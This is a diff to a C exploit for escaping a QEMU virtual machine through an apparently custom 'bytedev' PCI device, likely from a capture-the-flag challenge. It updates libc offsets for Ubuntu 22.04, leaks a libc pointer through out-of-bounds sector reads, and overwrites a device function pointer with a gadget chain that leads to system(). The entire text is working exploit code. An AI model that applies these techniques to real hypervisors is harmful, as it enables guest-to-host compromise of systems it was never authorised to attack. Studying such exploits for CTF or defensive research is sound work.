@@ -44,9 +44,9 @@
 #define BYTEDEV_SECTOR_SIZE 512
 #define BYTEDEV_SECTOR_NUM 256
 
-#define LIBC_SYSTEM 0x449c0
-#define LIBC_GADGET 0x128010
-#define LIBC_SETCONTEXT 0x474d0
+#define LIBC_SYSTEM 0x50d60
+#define LIBC_MOV_RSP_RDX_RET 0x5a170
+#define LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20 0x1675b0
 
 enum BYTEDEV_MODE {
     BYTEDEV_MODE_STREAM = 0,
@@ -233,8 +233,8 @@ void qemuEscape(void)
 
     /**
      * SECTOR -23: container
-     *      [54] g_str_hash
-     *      [55] g_str_equal
+     *      [55] g_str_hash
+     *      [56] g_str_equal
      * SECTOR -24: BYTEPCIDevState
      *      [27~34] name
      *      [35~] io_regions[PCI_NUM_REGIONS]
@@ -262,11 +262,15 @@ void qemuEscape(void)
     ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -23);
     read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);
 
-    if (buf[54] < 0x7f0000000000) {
+    if (buf[55] < 0x7f0000000000) {
+        for (int i = 0; i < BYTEDEV_SECTOR_SIZE / sizeof(uint64_t); i++) {
+            printf("[--data-dump--][%d] %llx\n", i, buf[i]);
+        }
         errExit("failed to leak libc related ptr!");
     }
 
-    libc_base = buf[54] - 0x432010;
+    /* This's the offset on the Ubuntu 22.04: GLIBC 2.35-0ubuntu3.1 */
+    libc_base = buf[55] - 0x3ea410;
 
     printf("\033[32m\033[1m[+] Got g_str_hash ptr: \033[0m%llx\n", buf[54]);
     printf("\033[32m\033[1m[+] Got libc_base: \033[0m%llx\n", libc_base);
@@ -283,11 +287,12 @@ void qemuEscape(void)
     ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -24);
     read(dev_fd, buf, 27 * sizeof(uint64_t));
     /**
-     * mov rdx, qword ptr [rdi + 8] ; 
+     * mov rdx, qword ptr [rdi + 8] ; -> store the ptr in opaque[1]
      * mov qword ptr [rsp], rax ; 
-     * call qword ptr [rdx + 0x20]
+     * call qword ptr [rdx + 0x20]  -> another call
      */
-    buf[30] = libc_base + LIBC_GADGET;
+    buf[30] = 
+        libc_base + LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20;
     write(dev_fd, buf, 31 * sizeof(uint64_t));
 
     /**
